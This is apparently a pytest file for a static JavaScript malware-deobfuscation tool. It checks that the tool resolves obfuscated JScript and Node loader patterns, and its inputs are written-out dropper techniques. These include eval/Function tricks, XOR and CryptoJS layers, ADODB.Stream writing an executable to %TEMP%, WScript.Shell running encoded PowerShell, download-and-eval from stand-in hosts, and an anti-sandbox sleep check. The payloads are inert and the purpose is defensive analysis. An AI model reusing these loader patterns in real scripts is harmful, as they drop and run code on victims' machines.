"""Improve languages, phase 3 (JavaScript): JScript / browser / Node scripts evaluated statically
(parsed with esprima and walked, never run): eval / Function layers, computed names, MSXML
bin.base64 + ADODB.Stream drops, CryptoJS, pako, Node, XOR loops, downloads and calls that depend
on the victim's machine.
"""

from __future__ import annotations

import base64
import gzip
import hashlib
import json
import sys
import zlib
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))
from test_js_techniques import _analyze, _ms, client  # noqa: E402,F401

pytest.importorskip("esprima")
from docutracex.resolve import js_eval  # noqa: E402

PE = b"MZ" + b"\x90\x00" * 30 + b" inert DocuTraceX stub " * 4


def _exec(code: str) -> list[str]:
    return [st.data for st in js_eval.resolve(code).stages if st.kind == "exec"]


@pytest.mark.parametrize(("code", "stage"), [
    ("[]['constructor']['constructor']('WScript.Echo(\"jsfuck\")')()", 'WScript.Echo("jsfuck")'),
    ("var a='ev', b='al'; window[a+b](atob('V1NjcmlwdC5FY2hvKCdoaScp'))", "WScript.Echo('hi')"),
    ("this['ev'+'al'](unescape('%57%53%63%72%69%70%74%2E%45%63%68%6F%28%31%29'))", "WScript.Echo(1)"),
    ('var s="%s".split("").reverse().join(""); eval(s)' % "WScript.Echo('reversed')"[::-1], "WScript.Echo('reversed')"),
    ("eval(String.fromCharCode.apply(null, [%s].map(function(x){return x-3})))"
     % ",".join(str(ord(c) + 3) for c in "WScript.Echo('apply')"), "WScript.Echo('apply')"),
    ("setTimeout('WScript.' + 'Echo(5)', 1)", "WScript.Echo(5)"),
    ("var f = Function; new f('WScript.Echo(6)')()", "WScript.Echo(6)"),
])
def test_exec_forms(code: str, stage: str) -> None:
    assert _exec(code)[:1] == [stage]


def test_xor_loop_fast_and_named() -> None:
    key = "k3y!"
    body = "var pad='" + "a" * 5000 + "'; WScript.Echo('xor layer')"
    enc = "".join(chr(ord(c) ^ ord(key[i % 4])) for i, c in enumerate(body))
    s = js_eval.resolve(f"var s={json.dumps(enc)}; var k='k3y!'; var r='';"
                        "for (var i=0;i<s.length;i++){ r+=String.fromCharCode(s.charCodeAt(i)^k.charCodeAt(i%k.length)); } eval(r);")
    st = s.stages[0]
    assert st.data == body and st.recipe[:2] == ("literal s", "xor(key k)") and s.stats["steps"] < 1000


def test_msxml_adodb_drop_and_run() -> None:
    s = js_eval.resolve(
        "var x = new ActiveXObject('MSXML2.DOMDocument').createElement('b'); x.dataType = 'bin.base64';"
        f"x.text = '{base64.b64encode(PE).decode()}';"
        "var st = new ActiveXObject('ADODB.Stream'); st.Type = 1; st.Open(); st.Write(x.nodeTypedValue);"
        "var sh = new ActiveXObject('WScript.Shell'); var p = sh.ExpandEnvironmentStrings('%TEMP%') + '\\\\inv.exe';"
        "st.SaveToFile(p, 2);"
        f"sh.Run('powershell -enc {base64.b64encode('Write-Host js'.encode('utf-16-le')).decode()}');")
    w = next(st for st in s.stages if st.kind == "write")
    assert w.data == PE and w.target == "%TEMP%\\inv.exe" and "base64 (MSXML bin.base64)" in w.recipe
    ds = s.decoded_stages()
    assert any(d.get("ext") == ".ps1" and d["text"] == "Write-Host js" for d in ds)


def _evp(pw: bytes, salt: bytes) -> tuple[bytes, bytes]:
    out = prev = b""
    while len(out) < 48:
        prev = hashlib.md5(prev + pw + salt).digest()  # noqa: S324
        out += prev
    return out[:32], out[32:48]


def test_cryptojs_pako_node() -> None:
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    pt = b"WScript.Echo('cryptojs stage')"
    k, iv = _evp(b"Factura#2026", b"saltsalt")
    pd = padding.PKCS7(128).padder()
    e = Cipher(algorithms.AES(k), modes.CBC(iv)).encryptor()
    blob = base64.b64encode(b"Salted__saltsalt" + e.update(pd.update(pt) + pd.finalize()) + e.finalize()).decode()
    s = js_eval.resolve(f"eval(CryptoJS.AES.decrypt('{blob}', 'Factura#2026').toString(CryptoJS.enc.Utf8))")
    assert s.stages[0].data == pt.decode() and any(r.startswith("aes(passphrase") for r in s.stages[0].recipe)
    s = js_eval.resolve(f"var u = Uint8Array.from(atob('{base64.b64encode(zlib.compress(b'WScript.Echo(7)')).decode()}'), c => c.charCodeAt(0));"
                        "eval(pako.inflate(u, {to: 'string'}))")
    assert s.stages[0].data == "WScript.Echo(7)"
    s = js_eval.resolve("const z = require('zlib'), fs = require('fs'), cp = require('child_process');"
                        f"fs.writeFileSync(process.env.TEMP + '\\\\x.exe', z.gunzipSync(Buffer.from('{base64.b64encode(gzip.compress(PE)).decode()}', 'base64')));"
                        "require('https').get('https://billing-portal.example/n.bin', r => {});")
    w = s.stages[0]
    assert w.kind == "write" and w.data == PE and w.recipe[:2] == ("base64", "gzip")
    assert s.downloads[0]["url"] == "https://billing-portal.example/n.bin"


def test_downloads_unresolved_and_self_read() -> None:
    s = js_eval.resolve(
        "var h = new ActiveXObject('MSXML2.XMLHTTP'); h.open('GET', 'https://billing-portal.example/p.js', false); h.send();"
        "eval(h.responseText);"
        "var sh = new ActiveXObject('WScript.Shell'); this[sh.RegRead('HKCU\\\\Software\\\\Fx\\\\n')]('x');"
        "this[sh.ExpandEnvironmentStrings('%FX_FN%')]('y');")
    assert s.downloads[0]["use"].startswith("runs it as code")
    deps = [u["depends_on"] for u in s.unresolved]
    assert "the registry value HKCU\\Software\\Fx\\n" in deps and "the environment variable FX_FN" in deps
    # an anti-sandbox check does not stop it, and reading its own file is resolved
    s = js_eval.resolve("var t0 = new Date().getTime(); WScript.Sleep(4000);"
                        "if (new Date().getTime() - t0 < 3000) { WScript.Quit(); }"
                        "var me = new ActiveXObject('Scripting.FileSystemObject').OpenTextFile(WScript.ScriptFullName, 1).ReadAll();"
                        "eval(me.substring(me.lastIndexOf('//P:') + 4));\n//P:WScript.Echo('tail')")
    assert s.stages[0].data == "WScript.Echo('tail')" and s.stages[0].recipe[0] == "the script's own file"


def test_obfuscatorio_sample_resolved() -> None:
    """obfuscator.io: string array, rotation loop with parseInt checks and the decoder, followed."""
    s = js_eval.resolve(_ms().obf_obfuscatorio_js().decode())
    assert any("cdn-update.example.net" in d["url"] for d in s.downloads)


def test_js_loader_sample_end_to_end(client) -> None:  # noqa: ANN001,F811
    """Two layers: the second (reversed base64 through MSXML, eval'd via this['ev'+'al']) in
    Nested, and under it the "executable" (XOR → bin.base64 → ADODB.Stream) and the PowerShell."""
    _cid, res = _analyze(client, "sample_js_loader.js", _ms().js_loader())
    js = json.loads((res / "javascript.json").read_text())
    r = js["scripts"][0]["resolution"]
    first = r["stages"][0]
    assert first["kind"] == "exec" and first["sink"] == "eval (called as this['ev' + 'al'])"
    assert first["recipe"][:3] == ["literal _b", "reverse", "base64 (MSXML bin.base64)"]
    kinds = {(s["kind"], s["depth"], s["type"]) for s in r["stages"]}
    assert ("write", 1, "pe") in kinds
    assert r["downloads"][0]["url"] == "https://billing-portal.example/inv/js-config.json"
    assert "Factura0187" in r["unresolved"][0]["depends_on"]
    rules = {f["rule"] for f in js["findings"]}
    assert {"js_resolved_stages", "javascript_resolved_download", "javascript_unresolved_dynamic_call"} <= rules

    def walk(ns):  # noqa: ANN001, ANN202
        for n in ns:
            yield n
            yield from walk(n.get("children") or [])
    tree = json.loads((res / "nested.json").read_text())["tree"]
    layer2 = next(n for n in tree if n["filename"].endswith(".js"))
    assert layer2["recipe"][:2] == ["literal _b", "reverse"]
    below = list(walk(layer2.get("children") or []))
    assert any(n.get("format") == "PE" for n in below)
    assert any(n["filename"].endswith(".ps1") for n in below)
